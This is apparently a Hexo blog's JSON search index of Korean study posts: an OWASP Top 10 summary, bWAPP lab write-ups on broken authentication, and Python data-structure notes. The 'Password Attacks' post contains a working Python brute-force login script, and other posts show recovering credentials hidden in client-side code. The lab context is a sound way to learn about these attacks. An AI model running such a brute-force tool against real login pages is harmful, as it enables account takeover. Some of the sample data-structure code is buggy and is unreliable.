{"pages":[{"title":"","text":"[{\"name\":\"DASHENG-900x700-1.png\",\"date\":1518959551960},{\"name\":\"DASHENG-900x700-2.png\",\"date\":1518959599098},{\"name\":\"DASHENG-900x700-3.png\",\"date\":1518959609913},{\"name\":\"DASHENG-900x700-4.png\",\"date\":1518959618105}]","link":"/hexo-admin-ehc-images.json"}],"posts":[{"title":"OWASP TOP 10 개요","text":"OWASP TOP 10이란?오픈 웹 어플리케이션 보안 프로젝트 커뮤니티인 OWASP(The Open Web Application Security Project)에서 제작됨. 웹 애플리케이션 취약점 중에서 빈도가 많이 발생하고, 보안상 영향을 크게 줄 수 있는 것들 10가지를 선정하여 2004년, 2007년, 2010년, 2013년, 2017년을 기준으로 발표되었고, 문서가 공개함. 2020년도 문서는 아직 발표되지 않았음. OWASP 공식 깃허브에서 확인해보면 2020년도 문서는 아직 제작 중인 상황임. OWASP TOP 10 2013년 - 2017년 변경 사항 node.js와 Spring Boot로 작성된 마이크로 서비스는 SPA(단일 애플리케이션)로 대체되고 있음. 주로 보안 문제 였던 마이크로 서비스, 컨테이너 등은 SPA와 모바일 어플리케이션에서 사용되는 API or RESTful 웹 서비스 뒤에 있음. 더 이상 신뢰할 수 있는 호출자와 같은 코드에 의한 아키텍처 가정은 유효하지 않음. Angular 및 React와 같은 자바스크립트 프레임워크로 작성된 SRA은 모듈식 기능이 많은 프론트엔드(서버의 기능을 프론트엔드에서 어느정도 가능)를 제작할 수 있음. 이에 클라이언트 측의 기능은 보안 문제를 야기할 수 있음. OWASP TOP 2017A1 - 주입 (Injection)SQL, OS, XEE, LDAP 인젝션 취약점은 신뢰할 수 없는 데이터가 명령어나 쿼리문의 일부분으로써, 인터프리터로 보내질 때 발생함. 공격자의 악의적인 데이터는 예상치 못한 명령을 실행하거나 올바른 권한 없이 데이터에 접근하도록 인터프리터를 속일 수 있음. A2 - 취약한 인증 (Broken Authentication)인증 및 세션 관리와 관련된 애플리케이션 기능이 종종 잘못 구현되어 공격자가 암호, 키, 세션 토큰을 위험에 노출 시킬 수 있거나 일시적인 또는 영구적으로 다른 사용자의 권한 획득을 위해 구현 상 결함을 악용하도록 허용함. A3 - 민감한 데이터 노출 (Sensitive Data Exposure)다수의 웹 애플리케이션과 API는 중요한 정보(금융 정보, 건강 정보, 개인 식별 정보 등)를 제대로 보호하지 못함.공격자는 범죄(신용카드 사기, 신분 도용 등)를 수행하기 위해 보호가 취약한 데이터를 훔치거나 수정할 수 있음.중요한 데이터는 저장 또는 전송 할 때 암호화 같은 추가적인 보호 조치가 없으면 탈취 당할 수 있으며, 브라우저에서 주고 받을 때 각별한 주의가 필요함. A4 - XML 외부 개체 (XXE : XML External Entities)오래되거나 잘못 구성된 XML 프로세서가 XML 문서 내에서 외부 개체 참조를 처리함.이러한 문제로 외부 개체로 파일 URI 핸들링, 내부 파일 공유, 내부 포트 스캔, 원격 코드 실행과 서비스 거부 공격에 사용될 수 있음. A5 - 취약한 접근 통제 (Broken Access Control)인증된 사용자가 수행할 수 있는 작업에 대한 제한이 제대로 적용되지 않음.공격자는 이러한 결함을 악용하여 다른 계정 접근, 중요한 파일 열람, 다른 계정의 데이터 수정, 접근 권한 변경 등의 권한이 없는 기능과 데이터에 접근 할 수 있음. A6 - 잘못된 보안 구성 (Security Misconfiguration)가장 흔하게 보이는 사건임.취약한 기본 설정, 임시 설정, 개방된 클라우드 스토리지, 잘못 구성된 HTTP 헤더 및 민감한 정보가 포함된 에러 메시지로 인한 결과임. A7 - 크로스 사이트 스크립팅 (XSS : Cross-Site Scripting)애플리케이션이 올바른 유효성 검사 또는 필터링 처리 없이 새로운 페이지에 신뢰할 수 없는 데이터를 포함하거나, 자바스크립트와 HTML을 생성하는 브라우저 API를 활용한 사용자 제공 데이터로 기존 페이지를 업데이트할 때 발생함.이러한 공격은 피해자의 브라우저에서 공격자에 의해 스크립트를 실행시켜 사용자 세션을 탈취할 수 있게 만들고, 사이트 변조나 악성 사이트 리다이렉션을 할 수 있도록 허용함. A8 - 안전하지 않은 역직렬화 (Insecure Deserialization)이 취약점은 종종 원격 코드 실행으로 이어지거나 권한 상승, Injection(주입), Replay(재전송) 공격을 포함한 다양한 공격 수행에 사용됨. A9 - 알려진 취약점이 있는 구성요소 사용 (Using Components with Known Vulnerabilities)라이브러리, 프레임워크 및 다른 소프트웨어 모듈 같은 컴포넌트는 애플리케이션과 같은 권한으로 실행됨.만약 취약한 컴포넌트가 악용된 경우, 이는 심각한 데이터 손실을 일으키거나 서버가 장악이 될 수 있음.알려진 취약점이 있는 컴포넌트를 사용한 애플리케이션과 API는 애플리케이션 방어를 약화시키거나 다양한 공격과 영향을 주게 됨. A10 - 불충분한 로깅 &amp; 모니터링 (Insufficient Logging &amp; Monitoring)공격자의 시스템을 공격 지속성을 유지 시키며, 더 많은 시스템을 공격할 수 있도록 만들게 됨. 또한 데이터 변조, 추출 또는 파괴를 할 수 도 있음.대부분의 침해 사례에서 침해를 탐지하는 시간이 200일이 넘게 걸리는 것을 보여주고, 이는 일반적으로 내부 프로세스와 모니터링보다 외부 기관이 탐지함.","link":"/2021/02/16/2020-OWASP-TOP-10/"},{"title":"Broken Auth - Forgotten Fuction","text":"Broken Auth - Forgotten FunctionLowbWAPP에 가입된 사용자의 Email를 입력하면 사용자의 비밀이 출력되는 페이지이다. 현재 bWAPP에 가입된 사용자의 Email를 알지 못하여, Create User 메뉴를 이용하여 사용자를 만들어줬다. 입력하니, 회원 가입할 때 입력한 secret이 출력되는 것을 확인 할 수 있었다. 여러 방법을 시도 했으나, 어떠한 취약점을 찾아 볼 수 없었다. 그래서 다른 분들의 Wirte Up를 찾아보니, bee 계정의 이메일을 넣어서 비밀을 보고 패스워드를 추측할 수 있다는 것이 이 문제의 답이였다. Bee 계정의 이메일 : bwapp-bee@mailinator.com해당 비밀을 보니, 패드워드는 bug와 관련된 확률이 높을 것으로 추측된다. 이 단서를 가지고 brute-force 공격을 시도하여 패스워드를 찾는게 이 문제의 답이였다. Medium &amp; High이 문제는 Medium과 High와 같다. 이메일을 입력하여 출력 결과를 보니, “이메일을 보내 수 없다.” 라는 결과를 얻을 수 있었다. 이 것을 보니 비밀은 이메일로 보내는 것을 알 수 있다. 이렇게 되면 해커가 이메일 계정 정보를 가지고 있지 않는 한 비밀이 유출되는 것을 막을 수 있을 것이다.","link":"/2021/01/26/Broken-Auth-Forgotten-Fuction/"},{"title":"Broken Auth - Insecure Login Forms","text":"Broken Auth. - Insecure Login FormsLow bee 계정으로 로그인을 시도했지만, 로그인에 실패하였다.form이 어디에 데이터를 보내는지, 문자 길이 제한 등을 확인하기 위해 개발자 도구를 이용하여 확인하였다. 1234567891011&lt;form action=&quot;/ba_insecure_login_1.php&quot; method=&quot;POST&quot;&gt; &lt;p&gt; &lt;label for=&quot;login&quot;&gt;Login:&lt;/label&gt;&lt;font color=&quot;white&quot;&gt;tonystark&lt;/font&gt;&lt;br&gt; &lt;input type=&quot;text&quot; id=&quot;login&quot; name=&quot;login&quot; size=&quot;20&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;&lt;font color=&quot;white&quot;&gt;I am Iron Man&lt;/font&gt;&lt;br&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; size=&quot;20&quot;&gt; &lt;/p&gt; &lt;button type=&quot;submit&quot; name=&quot;form&quot; value=&quot;submit&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; 위 코드를 확인해보니, /ba_insecure_login_1.php에 보내는 것을 확인할 수 있다.특이한 것은 흰색으로 tonystark과 I am Iron Man이 적혀져 있었다. 이 값을 form에 입력하여 전송했다. 로그인 성공 메시지가 출력되었다. 이런 경우가 진짜 있나?라고 하지만, 몇몇 커뮤니티 사이트에서 글 올린 사람의 ip 주소를 색상을 변경하여 페이지에 올려진 경우도 있다. Medium 페이지를 보니, Name에 brucebanner라는 값이 defalt로 지정되어있다.bruce를 보니, bruce force 공격을 의심이 된다. 15번 연속으로 틀려도 아무 제제가 없다.무차별 대입 공격을 의심을 해볼 가치는 있지만, 다른 가능성을 열어놓고 소스코드를 살펴보았다. 1234567891011&lt;form&gt; &lt;p&gt; &lt;label for=&quot;name&quot;&gt;Name:&lt;/label&gt;&lt;font color=&quot;white&quot;&gt;brucebanner&lt;/font&gt;&lt;br&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot; size=&quot;20&quot; value=&quot;brucebanner&quot;&gt; &lt;/p&gt; &lt;p&gt; &lt;label for=&quot;passphrase&quot;&gt;Passphrase:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;password&quot; id=&quot;passphrase&quot; name=&quot;passphrase&quot; size=&quot;20&quot;&gt; &lt;/p&gt; &lt;input type=&quot;button&quot; name=&quot;button&quot; value=&quot;Unlock&quot; onclick=&quot;unlock_secret()&quot;&gt;&lt;br&gt;&lt;/form&gt; 마지막 input 부분에 클릭 시 unlock_secret() 함수를 실행하는 것을 볼 수 있다.어떤 기능을 실행하는지 확인하였다. 12345678910111213141516171819202122232425262728293031323334function unlock_secret(){ var bWAPP = &quot;bash update killed my shells!&quot; var a = bWAPP.charAt(0); var d = bWAPP.charAt(3); var r = bWAPP.charAt(16); var b = bWAPP.charAt(1); var e = bWAPP.charAt(4); var j = bWAPP.charAt(9); var c = bWAPP.charAt(2); var f = bWAPP.charAt(5); var g = bWAPP.charAt(4); var j = bWAPP.charAt(9); var h = bWAPP.charAt(6); var l = bWAPP.charAt(11); var g = bWAPP.charAt(4); var i = bWAPP.charAt(7); var x = bWAPP.charAt(4); var l = bWAPP.charAt(11); var p = bWAPP.charAt(23); var m = bWAPP.charAt(4); var s = bWAPP.charAt(17); var k = bWAPP.charAt(10); var d = bWAPP.charAt(23); var t = bWAPP.charAt(2); var n = bWAPP.charAt(12); var e = bWAPP.charAt(4); var a = bWAPP.charAt(1); var o = bWAPP.charAt(13); var f = bWAPP.charAt(5); var b = bWAPP.charAt(1); var q = bWAPP.charAt(15); var h = bWAPP.charAt(9); var c = bWAPP.charAt(2); var h = bWAPP.charAt(2); var i = bWAPP.charAt(7); var j = bWAPP.charAt(5); var i = bWAPP.charAt(7); var y = bWAPP.charAt(22); var g = bWAPP.charAt(1); var p = bWAPP.charAt(4); var p = bWAPP.charAt(28); var l = bWAPP.charAt(11); var k = bWAPP.charAt(14); var q = bWAPP.charAt(12); var n = bWAPP.charAt(12); var m = bWAPP.charAt(4); var o = bWAPP.charAt(19); var secret = (d + &quot;&quot; + j + &quot;&quot; + k + &quot;&quot; + q + &quot;&quot; + x + &quot;&quot; + t + &quot;&quot; +o + &quot;&quot; + g + &quot;&quot; + h + &quot;&quot; + d + &quot;&quot; + p); if(document.forms[0].passphrase.value == secret) { // Unlocked location.href=&quot;/ba_insecure_login_2.php?secret=&quot; + secret; } else { // Locked location.href=&quot;/ba_insecure_login_2.php?secret=&quot;; }} 해더 부분에 정의된 unlock_secret 함수이다.charAt 함수가 무슨 함수인지 몰라서 인터넷에 검색하였다. ) 알파벳 변수에 bWAPP 변수의 문자열을 charAt 함수로 지정된 인덱스에 해당한 값을 넣어주고, secret 변수에 필요한 알파벳 변수만 넣었다. 그리고 Passphrase 값이 secret 변수와 같으면 secret 변수를 서버로 전송하였다. 기능은 확인하였으니, secret 값을 구해보겠다. 개발자 도구의 Console에 해당 부분을 넣어서 출력하는 방법으로 secret 값을 구할 수 있었다. 로그인에 성공한 모습이다. 여기서 알 수 있는 점은 패스워드와 같은 중요한 값은 클라이언트에서 검증하기보단 서버에서 검증하는 것이 더 안전하다는 것을 알 수 있었다. High 이번엔 form 밑에 Remember 데이터가 있다.이 값을 입력하여 로그인을 하였다. 굳이 글로 쓰자면, 계정 정보를 추측 할 수 있는 데이터는 안전한 페이지나 이메일로 전달해야 안전하다는 것을 알 수 있었다.","link":"/2021/02/02/Broken-Auth-Insecure-Login-Forms/"},{"title":"Broken Auth - Logout Management","text":"Low here를 누르면 로그아웃이 된다고 써져있다.개발자 도구를 이용하여 소스코드를 살펴보았다. 1&lt;a href=&quot;ba_logout_1.php&quot; onclick=&quot;return confirm('Are you sure?');&quot;&gt;here&lt;/a&gt; here를 클릭하면, 확인 alert 창이 뜨고 ba_logout_1.php로 이동하는 것을 볼 수 있었다. 세션이 제대로 만료가 됬는지 확인을 위해 뒤로가기를 하였다. 하지만 세션은 제대로 처리가 안되서 로그인이 된 채로 원래 페이지로 돌아왔다. Source Code123456789101112131415161718192021222324&lt;?phpswitch($_COOKIE[&quot;security_level&quot;]){ case &quot;0&quot; : // Do nothing break; case &quot;1&quot; : // Destroys the session session_destroy(); break; case &quot;2&quot; : // Unsets all of the session variables $_SESSION = array(); // Destroys the session session_destroy(); break; default : // Do nothing break;}?&gt; Low는 0으로 매핑 되어있는데 로그아웃 기능을 연결시켜주는 코드를 보니 0은 아무것도 하지 않고 끝난다. Medium &amp; High위 Source Code를 보면 session_destroy 함수를 이용하여 세션을 처리해주었다.","link":"/2021/02/04/Broken-Auth-Logout-Management/"},{"title":"Broken Auth - Password Attacks","text":"Low &amp; Medium 이번엔 비밀번호 공격이라는 문제가 나왔다.어떤 방식으로 작동하는지 잘 모르겠어서 알고있는 계정인 bee/bug를 입력하여 성공 시 어떤 출력값이 나오는지와 틀리면 어떤 출력값이 나오는지 살펴보았다. 실패한 출력값이 비밀번호가 틀렸다는 문구가 나왔다.아이디를 넣으면 어떤 출력값이 나오는지도 살펴보았지만, 똑같은 출력이 나온다. 만약 아이디가 틀렸을 시, ‘가입된 회원이 아닙니다.’ 문구가 나왔으면 가입된 아이디를 파싱하는데 중요한 키워드가 될 것이다. 일단 정확한 아이디 값이 있으면, 비밀번호를 무차별 대입 공격으로 찾을 수 있을 것이다. burp suite으로 공격하는 쉬운 방법도 있지만, 공부하는 마음으로 파이썬으로 직접 제작하여 공격해보겠다. Brute force attack code123456789101112131415161718192021222324252627282930313233343536373839404142import requestsfrom bs4 import BeautifulSoup as bsfrom string import ascii_letters, digitsfrom itertools import productclass Attack(): def __init__(self, url, sesstion, level): self._url = url self._sesstion = sesstion self._level = level self._sesstionData = {'security_level' : self._level, 'PHPSESSID' : self._sesstion} self.passwordList = () def word_create(self): charList = ascii_letters + digits passwordLegth = int(input('Password Legth : ')) self.passwordList = tuple(product(charList, repeat=passwordLegth)) # return self.passwordList def attack_start(self): userId = input('id : ') for _ in self.passwordList: datas = {'login' : userId, 'password' : ''.join(_), 'form' : 'submit'} req = requests.post(url, data=datas, cookies=self._sesstionData) html = req.text soup = bs(html, 'html.parser') result = soup.select_one('#main &gt; font') if result == 'Successful login!': return ''.join(_)if __name__ == '__main__': url = input('taget : ') sesstion = input('sesstion : ') level = input('level : ') test = Attack(url, sesstion, level) test.word_create() print(test.attack_start()) 만들긴 했으나, 패스워드를 얻기 위해 엄청난 시간이 필요하다.멀티프로세싱을 했으면, 좀 더 빠르게 끝낼 수는 있다. 위 코드의 결과값으로 패스워드는 bug가 나왔다.시간이 굉장히 많이 걸리니, 코드를 수정하여 멀티프로세싱을 하거나 burp suit으로 시도하면 된다. 그리고 위에서 나온대로 아이디가 틀렸을 시 ‘가입된 회원이 아닙니다.’ 문구가 나오면 아이디를 파싱할 수 있다고 했는데 Create User에서 파싱 할 수 있다. 출력값이 로그인 또는 이메일이 이미 존재한다고 나온다. High무차별 대입 공격의 해결 방법으로 해당 사진에서는 캡챠 사진이 안보이지만, 캡챠를 도입하여 bot의 공격을 차단하였다.하지만 Death by Captcha, Antigate, Anti Captcha 등 캡챠를 우회하기 위한 API가 있으므로, 캡챠만 사용해선 좋은 방어가 아니라고 생각한다. 여기서 횟수 제한을 주어 로그인 실패 횟수가 되면 몇 분 동안 로그인 시도를 못하도록 하고, 횟수 제한으로 로그인 제제가 몇 번 일어나면 하루동안 IP를 차단하거나 해당 계정의 로그인을 못하도록 해야하는 것이 좋은 방어 방법이라 생각한다.","link":"/2021/02/05/Broken-Auth-Password-Attacks/"},{"title":"Broken Auth - Weak Passwords","text":"Low &amp; Medium &amp; High 문제의 제목이 취약한 패스워드이다.예상으로는 디폴트 패스워드나 보안이 낮은 패스워드를 이용하여 문제를 풀어야 할 것 같다. 현 문제에서 어떠한 계정의 정보도 없어서 일단 bee 계정으로 로그인을 시도하였다. 로그인 실패 값이 출력되었다.특정 계정이 있는거 같은데, 일단 ID값을 admin으로 패스워드을 추측해보았다.admin/admin, admin/AdMiN 등을 시도해보았지만, 결국엔 모두 실패하였다. 그래서 소스코드를 확인해보니, 위와 같은 코드가 있었다. ID 값이 test이며, Low Level일 때는 소문자 test을 패스워드로 하였을 때 성공이라고 뜬다. 시도해보니, 로그인 성공을 볼 수 있었다. 문제를 풀기 위해선 ID값이 필요할 것 같은데… 없어서 할 수 없이 소스코드를 확인한 문제이다.이 문제에선 dictionary password attack과 Brute force attack을 방어하기 위해 복잡한 패스워드를 가질 필요성이 있다는 것을 알려주고 있다.","link":"/2021/02/07/Broken-Auth-Weak-Passwords/"},{"title":"Data Structure - Double Linked List 구현","text":"Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from LinkedList_ex3 import Nodeclass DoubleNode(Node): '''Double Linked List''' def __init__(self, data, back=None, next=None): super().__init__(data, next) self.back = backclass DoubleNodeMgmt(): '''Double Linked List Management''' def __init__(self, data): self.head = DoubleNode(data) def add(self, data): # head가 없으면 head 지정 if self.head == '': self.head = DoubleNode(data) else: node = self.head while node.next: node = node.next node.next = DoubleNode(data) node.next.back = node def delete(self, data): if self.head == '': print('Node가 없습니다.') elif self.head.data == data: temp = self.head self.head = self.head.next self.head.back = None del temp else: node = self.head while node.next: if node.next.data == data: temp = node.next node.next = node.next.next node.next.back = node del temp else: node = node.next def front_desc(self): print('--- Front Desc ---') node = self.head while node.next: print(node.data, end=' ') node = node.next print(node.data) def end_desc(self): print('---End Desc---') node = self.head while node.next: node = node.next while node.back: print(node.data, end=' ') node = node.back print(node.data)if __name__ == '__main__': dnl = DoubleNodeMgmt(1) for _ in range(2, 10): dnl.add(_) dnl.front_desc() dnl.delete(3) dnl.front_desc() dnl.end_desc() 출력123456--- Front Desc ---1 2 3 4 5 6 7 8 9--- Front Desc ---1 2 4 5 6 7 8 9---End Desc---9 8 7 6 5 4 2 1 전에 만들어 놓은 Linked List의 Node 클래스를 굳이 가지고 와서 Double Node를 구현하였다.","link":"/2021/02/15/Data-Structure-Double-Linked-List-%EA%B5%AC%ED%98%84/"},{"title":"Data Structure - Hash Table","text":"Hash Table 키(Key)에 데이터(Value)를 저장하는 데이터 구조 보통 배열로 미리 Hash Table 사이즈만큼 생성 후 사용 (공간과 탐색 시간을 맞바꾸는 기법) 알아둘 용어 해쉬(Hash) : 임의 값을 고정 길이로 변환하는 것 해쉬 테이블(Hash Table) : 키 값의 연산에 의해 직접 접근이 가능한 데이터 구조 해싱 함수(Hashing Function) : Key에 대해 산술 연산을 이용해 데이터 위치를 찾을 수 있는 함수 해쉬 값(Hash Value) &amp; 해쉬 주소(Hash Address) : Key를 해싱 함수로 연산해서, 해쉬 값을 알아내고, 이를 기반으로 해쉬 테이블에서 해당 Key에 대한 데이터 위치를 일관성 있게 찾을 수 있음. 슬롯(Slot) : 한 개의 데이터를 저장할 수 있는 공간 장단점장점 데이터 저장/읽기 속도가 빠르다. (검색 속도가 빠르다.) 해쉬는 키에 대한 데이터가 있는지(중복) 확인이 쉬움. 단점 일반적으로 저장공간이 좀 더 많이 필요하다. 여러 키에 해당하는 주소가 동일할 경우 충돌을 해결하기 위한 별도의 자료구조가 필요하다. 충돌을 피하기 위해 저장공간을 늘려서 남은 저장공간에 값을 넣는다. 이는 공간을 소비하는 대신 검색 속도를 높이는 기법이다. 주요 용도 검색이 많이 필요한 경우 저장, 삭제, 읽기가 빈번한 경우 해쉬 구현 시 (중복 확인이 쉽기 때문) 충돌(Collision) 해결 알고리즘Chaining 기법 개방 해슁(Open Hashing)기법 중 하나 : 해쉬 테이블 저장공간 외의 공간을 활용하는 기법 충돌이 일어나면, Linked List라는 자료 구조를 사용해서, 추가로 데이터 뒤에 연결시켜서 저장하는 기법 Linear Probing 기법 패쇄 해싱(Close Hashing)기법 중 하나 : 해쉬 테이블 저장공간 안에서 충돌 문제를 해결하는 기법 충돌이 일어나면, 해당 Hash Address의 다음 Address부터 맨 처음 나오는 빈 공간에 저장하는 기법 이 기법은 저장 공간 활용도를 높이기 위한 기법","link":"/2021/02/16/Data-Structure-Hash-Table/"},{"title":"Data Structure - Linked List 구현","text":"Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869class Node: def __init__(self, data, next=None): self.data = data self.next = nextclass NodeMgmt: def __init__(self, data): self.head = Node(data) def add(self, data): if self.head == '': self.head = Node(data) else: node = self.head # 마지막 노드를 찾기 위한 반복문 while node.next: node = node.next node.next = Node(data) def delete(self, data): if self.head == '': print('Node가 없습니다.') if self.head.data == data: temp = self.head self.head = self.head.next del temp else: node = self.head while node.next: if node.next.data == data: temp = node.next node.next = node.next.next del temp else: node = node.next def desc(self): node = self.head # node가 없을 때 if node is None: print(None) return while node.next: print(node.data, end=' ') node = node.next print(node.data)if __name__ == '__main__': link = NodeMgmt(1) for _ in range(2, 10): link.add(_) link.desc() link.delete(1) link.desc() link.delete(3) link.desc() for _ in range(2, 10): link.delete(_) link.desc() 출력12341 2 3 4 5 6 7 8 92 3 4 5 6 7 8 92 4 5 6 7 8 9None","link":"/2021/02/14/Data-Structure-Linked-List-%EA%B5%AC%ED%98%84/"},{"title":"Data Structure - Linked List","text":"Linked List 연결 리스트라고 많이 불림.떨어진 곳에 존재하는 데이터의 주소를 저장하여, 연결해 관리하는 데이터 구조 배열과 많이 혼돈하지만, 배열은 순차적으로 메모리 공간에 데이터를 나열하는 데이터 구조연결 리스트는 각기 다른 메모리 공간에 데이터를 저장하여, 데이터의 저장 공간 주소가 저장 필요 알아둘 용어 노드(Node) : 데이터 저장 단위(데이터 값, 포인터)로 구성 포인터(Pointer) : 각 노드 안에서, 다음이나 이전의 노드와의 연결 정보를 가지고 있는 공간 장단점장점 미리 데이터 공간을 할당하지 않아도 됨 단점 연결을 위한 별도의 데이터 공간(Pointer)이 필요함으로, 저장 공간 효율이 높지 않음 연결 정보를 찾는 시간이 필요하므로 접근 속도가 느림 중간 데이터 삭제/삽입 시, 앞뒤 데이터의 연결을 재 구성해야 하는 부가적인 작업 필요함 다양한 연결 리스트이중 연결 리스트 원형 연결 리스트","link":"/2021/02/12/Data-Structure-Linked-List/"},{"title":"Data Structure - Queue","text":"Queue 가장 먼저 넣은 데이터를 가장 먼저 꺼낼 수 있는 구조 (FIFO - First In, First Out)흔히 놀이공원에서 줄 쓰는 거랑 같다고 생각하면 됨. 알아둘 용어 Enqueue (Push) : 큐에 데이터를 넣는 기능 Dequeue (Pop) : 큐에서 데이터를 꺼내는 기능 파이썬에서 Queue 라이브러리 활용해서 큐 사용하기파이썬의 queue 라이브러리에는 다양한 큐( Queue(), LifoQueue(), PriorityQueue() ) 제공됨. Queue() : 일반적인 Queue LifoQueue() : 나중에 입력된 데이터가 먼저 출력되는 구조 (스택) PriorityQueue() : 데이터마다 우선 순위를 넣어서, 우선 순위가 높은 순으로 데이터 출력 Queue() 사용하기Code1234567891011121314151617import queuedata_queue = queue.Queue()# Queue Putdata_queue.put('1번째 데이터')data_queue.put('2번째 데이터')data_queue.put('3번째 데이터')data_queue.put('4번째 데이터')data_queue.put('5번째 데이터')# Queue의 크기print('Size of Queue &gt;&gt;&gt; ', data_queue.qsize())# Queue Popprint('Queue Pop &gt;&gt;&gt;', data_queue.get())print('Queue Pop &gt;&gt;&gt;', data_queue.get()) 출력123Size of Queue &gt;&gt;&gt; 5Queue Pop &gt;&gt;&gt; 1번째 데이터Queue Pop &gt;&gt;&gt; 2번째 데이터 LifoQueue() 사용하기Code1234567891011121314151617import queuedata_queue = queue.LifoQueue()# Queue Putdata_queue.put('1번째 데이터')data_queue.put('2번째 데이터')data_queue.put('3번째 데이터')data_queue.put('4번째 데이터')data_queue.put('5번째 데이터')# Queue의 크기print('Size of Queue &gt;&gt;&gt; ', data_queue.qsize())# Queue Popprint('Queue Pop &gt;&gt;&gt;', data_queue.get())print('Queue Pop &gt;&gt;&gt;', data_queue.get()) 출력123Size of Queue &gt;&gt;&gt; 5Queue Pop &gt;&gt;&gt; 5번째 데이터Queue Pop &gt;&gt;&gt; 4번째 데이터 PriotityQueue() 사용하기Code123456789101112131415161718import queuedata_queue = queue.PriorityQueue()# Queue Putdata_queue.put((4, '1번째 데이터'))data_queue.put((5, '2번째 데이터'))data_queue.put((2, '3번째 데이터'))data_queue.put((1, '4번째 데이터'))data_queue.put((3, '5번째 데이터'))# Queue의 크기print('Size of Queue &gt;&gt;&gt; ', data_queue.qsize())# Queue Popprint('Queue Pop &gt;&gt;&gt;', data_queue.get())print('Queue Pop &gt;&gt;&gt;', data_queue.get()) 출력123Size of Queue &gt;&gt;&gt; 5Queue Pop &gt;&gt;&gt; (1, '4번째 데이터')Queue Pop &gt;&gt;&gt; (2, '3번째 데이터') 우선 순위는 공무원 7급 &gt; 8급 &gt; 9급처럼 낮은 숫자가 우선 순위가 높다. 어디에 사용할까?어떠한 작업/데이터를 순서대로 실행/사용하기 위해 대기시킬 때 사용함.ex) 멀티 태스킹을 위한 프로세스 스케쥴링 방식을 구현하기 위해 많이 사용됨 (운영체제) 실제로 사람들이 식당이나 놀이공원에서 어떻게 대기하는지 생각하면 된다.자원은 식당의 공간이 한정적이니깐, 먼저 온 사람 순으로 먹기 위해선 FIFO로 해야된다. 이와 마찬가지로 CPU는 한정적이니 프로그램이 CPU를 얻기 위해서 대기를 해야하는데 이를 구현하기 위해 Queue를 사용하는 것이다. ProiorityQueue는 놀이공원의 VIP 티켓이라 생각하면된다. VIP는 늦게와도 먼저 들어가니깐…","link":"/2021/02/10/Data-Structure-Queue/"},{"title":"Data Structure - Stack 구현","text":"code123456789101112131415161718192021class Stack: def __init__(self): self.stack = list() def push(self, data): self.stack.append(data) def pop(self): data = self.stack[-1] del self.stack[-1] return dataif __name__ == '__main__': s = Stack() for _ in range(10): Stack.push(_) print('Stack Print &gt;&gt;&gt;', *s) print('Stack Pop &gt;&gt;&gt;', s.pop()) print('Stack Pop &gt;&gt;&gt;', s.pop()) print('Stack Print &gt;&gt;&gt;', *s) 출력1234Stack Print &gt;&gt;&gt; 0 1 2 3 4 5 6 7 8 9Stack Pop &gt;&gt;&gt; 9Stack Pop &gt;&gt;&gt; 8Stack Print &gt;&gt;&gt; 0 1 2 3 4 5 6 7","link":"/2021/02/11/Data-Structure-Stack-%EA%B5%AC%ED%98%84/"},{"title":"Data Structure - Stack","text":"Stack 가장 나중에 쌓은 데이터를 가장 먼저 꺼낼 수 있는 데이터 구조 (LIFO - Last In, First Out)흔히 책상에 책을 쌓는 거랑 똑같다고 생각하면 됨. 장단점장점 구조가 단순해서, 구현이 쉽다. 데이터 저장/읽기 속도가 빠르다. 단점 데이터 최대 갯수를 미리 정해야 한다. (파이썬의 경우, 재귀 함수는 최대 1000번까지 가능) 저장 공간의 낭비가 발생할 수 있다. 하지만, 필요한 만큼의 스택의 공간만 세팅을 한다면, 저장 공간 낭비를 막을 수 있다. 알아둘 용어 push : 데이터를 스택에 넣기 pop : 데이터를 스택에 꺼내기 파이썬에서 Stack 사용하기Stack은 파이썬에서 Queue 라이브러리처럼 지원을 하지 않음.하지만, List을 이용하여 보다 쉽게 구현 가능함. code123456789101112stack = list()stack.append(1)stack.append(2)stack.append(3)stack.append(4)stack.append(5)print('Stack Print &gt;&gt;&gt;', *stack)print('Stack Pop &gt;&gt;&gt;', stack.pop())print('Stack Pop &gt;&gt;&gt;', stack.pop())print('Stack Print &gt;&gt;&gt;', *stack) 출력1234Stack Print &gt;&gt;&gt; 1 2 3 4 5Stack Pop &gt;&gt;&gt; 5Stack Pop &gt;&gt;&gt; 4Stack Print &gt;&gt;&gt; 1 2 3 어디에 사용할까?스택은 많은 곳에 사용되는데, 대표적으로 프로세스의 함수 동작 방식에 사용함.함수 호출 시 전달되는 인자, 되돌아갈 주소값 및 함수 내에서 선언하는 변수 등을 저장한다. 위의 설명은 리버싱 공부를 한다면 많이 볼 것이다.","link":"/2021/02/11/Data-Structure-Stack/"},{"title":"Data Structure - Tree","text":"TreeNode와 Branch를 이용해서, 사이클을 이루지 않도록하는 데이터 구조 알아둘 용어 Node : 트리에서 데이터를 저장하는 기본 요소(데이터와 다른 연결된 노드에 대한 Branch 정보 포함) Root Node : 트리 맨 위에 있는 Node Parent Node : 어떤 노드의 다음 레벨에 연결된 노드 Child Node : 어떤 노드의 상위 레벨에 연결된 노드 Leaf Node(Teminal Node): Child Node가 하나도 없는 녿, Sibling(Broder Node) : 동일한 Parent Node를 가진 노드 Level : 최상위 노드를 Level 0으로 했을 때, 하위 Branch로 연결된 노드의 깊이를 나타냄 Depth : 트리에서 Node가 가질 수 있는 최대 Level 이진 트리 vs 이진 탐색 트리(Binary Search Tree)이진 트리노드의 최대 Branch가 2인 트리 이진 탐색 트리(BST) 왼쪽 노드는 해당 노드보다 작은 값, 오른쪽 노드는 해당 노드보다 큰 값을 가지고 있음. BST의 장단점출처 : mathwarehouse.com 장점 탐색 속도를 개선 할 수 있음. 단점 평균 시간 복잡도는 O(log n)이지만, 이는 트리가 균형이 잡혀있을 때의 평균 시간 복잡도이다. 출처 : mathwarehouse.com 최악의 경우, 링크드 리스트 등과 동일한 성늘을 보여줌 O(n)","link":"/2021/02/20/Data-Structure-Tree/"},{"title":"Data Structure - Queue 구현","text":"파이썬의 리스트 변수를 이용하여 Queue 